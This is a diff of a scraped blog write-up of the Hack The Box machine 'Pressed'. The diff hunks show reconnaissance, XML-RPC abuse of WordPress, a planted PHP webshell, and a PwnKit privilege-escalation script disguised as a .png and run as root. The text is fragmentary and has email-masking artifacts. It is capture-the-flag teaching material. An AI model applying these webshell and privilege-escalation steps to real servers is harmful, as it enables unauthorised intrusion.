@@ -1,13 +1,17 @@
-HTB: Pressed | 0xdf hacks stuff {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-03T10:00:00+00:00","datePublished":"2022-02-03T10:00:00+00:00","description":"Pressed presents a unique attack vector on WordPress, where you have access to admin creds right from the start, but can’t log in because of 2FA. This means it’s time to abuse XML-RPC, the thing that wpscan shows as a vulnerability on every WordPress instance, is rarely useful. I’ll leak the source for the single post on the site, and see that’s it’s using PHPEverywhere to run PHP from within the post. I’ll edit the post to include a webshell. The firewall is blocking outbound traffic, so I can’t get a reverse shell. The box is vulnerable to PwnKit, so I’ll have to modify the exploit to work over the webshell. After leaking the root flag, I’ll go beyond with a Video where I take down the firewall and get a root shell.","headline":"HTB: Pressed","image":"https://0xdf.gitlab.io/img/pressed-cover.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xdf.gitlab.io/2022/02/03/htb-pressed.html"},"url":"https://0xdf.gitlab.io/2022/02/03/htb-pressed.html"}      window.dataLayer = window.dataLayer || \[\]; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-P056MVQVGM');  
+# HTB: Pressed | 0xdf hacks stuff
 
-[0xdf hacks stuff](/)
+* "description":"Pressed presents a unique attack vector on WordPress, where you have access to admin creds right from the start, but can’t log in because of 2FA. This means it’s time to abuse XML-RPC, the thing that wpscan shows as a vulnerability on every WordPress instance, is rarely useful. 
 
-[![](/icons/youtube.png)YouTube](https://youtube.com/@0xdf) 
+I’ll leak the source for the single post on the site, and see that’s it’s using PHPEverywhere to run PHP from within the post. I’ll edit the post to include a webshell. The firewall is blocking outbound traffic, so I can’t get a reverse shell. 
 
-[![](/icons/gitlab.png)Gitlab](https://gitlab.com/0xdf/ctfscripts)
+The box is vulnerable to PwnKit, so I’ll have to modify the exploit to work over the webshell. After leaking the root flag, I’ll go beyond with a Video where I take down the firewall and get a root shell.
 
-[![](/icons/rss.png)feed](/feed.xml)
+* "headline":"HTB: Pressed","image":"https://0xdf.gitlab.io/img/pressed-cover.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xdf.gitlab.io/2022/02/03/htb-pressed.html"},"url":"https://0xdf.gitlab.io/2022/02/03/htb-pressed.html"}      window.dataLayer = window.dataLayer || \[\]; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-P056MVQVGM');  
 
+# [0xdf hacks stuff](/)
+
+[![image](/icons/youtube.png)YouTube]](https://youtube.com/@0xdf) 
+[![image](/icons/gitlab.png)Gitlab]](https://gitlab.com/0xdf/ctfscripts)[![](/icons/rss.png)feed](/feed.xml)
 [![Buy me a coffee](https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg)](https://www.buymeacoffee.com/0xdf)
 
 HTB: Pressed
@@ -65,7 +69,7 @@ Recon
 
 `nmap` found one open TCP ports, HTTP (80):
 
-    oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.142
+    [email protected]$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.142
     Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-31 13:09 EST
     Nmap scan report for 10.10.11.142
     Host is up (0.093s latency).
@@ -74,7 +78,7 @@ Recon
     80/tcp open  http
     
     Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
-    oxdf@hacky$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.142
+    [email protected]$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.142
     \Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-31 13:09 EST
     Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
     NSE Timing: About 0.00% done
@@ -130,7 +134,7 @@ Given the use of WordPress, I’ll tend to look at things like [wpscan](https://
 
 I’ll give it my API which I got for free from the WPScan website, and let it run:
 
-    oxdf@hacky$ wpscan --url http://pressed.htb --api-token $WPSCAN_API
+    [email protected]$ wpscan --url http://pressed.htb --api-token $WPSCAN_API
     ...[snip]...
     [+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
      | Found By: Direct Access (Aggressive Detection)
@@ -215,7 +219,7 @@ The WordPress site has a [list of the typical methods](https://codex.wordpress.o
 
 I’ll start with the `listMethods` using the payload from the [documentation](https://codex.wordpress.org/XML-RPC/system.listMethods) and `curl`:
 
-    oxdf@hacky$ curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
+    [email protected]$ curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
     <?xml version="1.0" encoding="UTF-8"?>          
     <methodResponse>
       <params>
@@ -249,7 +253,7 @@ I’ll start with the `listMethods` using the payload from the [documentation](h
 
 Right away, one jumps out as interesting, `htb.get_flag`. I’ll try that one:
 
-    oxdf@hacky$ curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
+    [email protected]$ curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
     <?xml version="1.0" encoding="UTF-8"?>
     <methodResponse>
       <params>
@@ -267,7 +271,7 @@ That’s actually the user flag!
 
 I can try something like `wp.getPosts`, but it fails with a 400 for “Insufficient arguments”:
 
-    oxdf@hacky$ curl --data "<methodCall><methodName>wp.getPosts</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
+    [email protected]$ curl --data "<methodCall><methodName>wp.getPosts</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
     <?xml version="1.0" encoding="UTF-8"?>
     <methodResponse>
       <fault>
@@ -293,7 +297,7 @@ Looking at the [documentation](https://codex.wordpress.org/XML-RPC_WordPress_API
 
 This interface isn’t intended to be interacted with manually, but rather with a client. There are lots of PHP clients out there, but I prefer working in Python, and there is [python-wordpress-xmlrpc](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html). After `pip install python-wordpress-xmlrpc`, I’ll drop into a Python REPL:
 
-    oxdf@hacky$ python
+    [email protected]$ python
     Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
     [GCC 9.3.0] on linux
     Type "help", "copyright", "credits" or "license" for more information.
@@ -387,7 +391,7 @@ When all my attempts to get a reverse shell failed, I turned back to just trying
 
 There doesn’t seem to be any way to connect back. `curl` and `nc` both just hang trying to connect back. Even `ping` failed:
 
-    oxdf@hacky$ ./webshell.sh 'ping -c 1 10.10.14.6'
+    [email protected]$ ./webshell.sh 'ping -c 1 10.10.14.6'
     PING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.
     
     --- 10.10.14.6 ping statistics ---
@@ -400,9 +404,9 @@ Looks like I’ll need to enumerate the box using the webshell.
 
 I know that UHC likes to show off the current trending vulnerabilities, and [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) (CVE-2021-4034) is certainly one of those. Unfortunately, when `pkexec` was patched for PwnKit, they didn’t change the version number, so there’s no way to tell from the version if it it patched or not. However, I can look at timestamps:
 
-    oxdf@hacky$ ./webshell.sh 'which pkexec'
+    [email protected]$ ./webshell.sh 'which pkexec'
     /usr/bin/pkexec
-    oxdf@hacky$ ./webshell.sh 'ls -l /usr/bin/pkexec'
+    [email protected]$ ./webshell.sh 'ls -l /usr/bin/pkexec'
     -rwsr-xr-x 1 root root 31032 Jul 14  2021 /usr/bin/pkexec
     
 
@@ -466,7 +470,7 @@ It’s even nice enough to give me the full path!
 
 I can just call `bash` on that file (even with the `.png` extension, though I could also move it with the webshell), and it works:
 
-    oxdf@hacky$ ./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
+    [email protected]$ ./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
     ██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
     ██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
     ██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
@@ -487,7 +491,7 @@ Because it prints out `uid=0`, that shows it ran as root.
 
 I can remove the image from the server (with the webshell) change the last line in my local copy to `cat /root/root.txt`, upload it again, and run it to get the flag:
 
-    oxdf@hacky$ ./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
+    [email protected]$ ./webshell.sh 'bash /var/www/html/wp-content/uploads/2022/02/pkwner.png'
     ██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
     ██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
     ██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
@@ -522,7 +526,7 @@ Here’s the [video](https://www.youtube.com/watch?v=9xX2ASQgpSU):
 ----------------
 
 *   0xdf hacks stuff
-*   [0xdf.223@gmail.com](mailto:0xdf.223@gmail.com)
+*   [\[email protected\]](/cdn-cgi/l/email-protection#eede968a88c0dcdcddae89838f8782c08d8183)
 
 *   [0xdf\_](https://www.twitter.com/0xdf_)
 *   [0xdf](https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A)
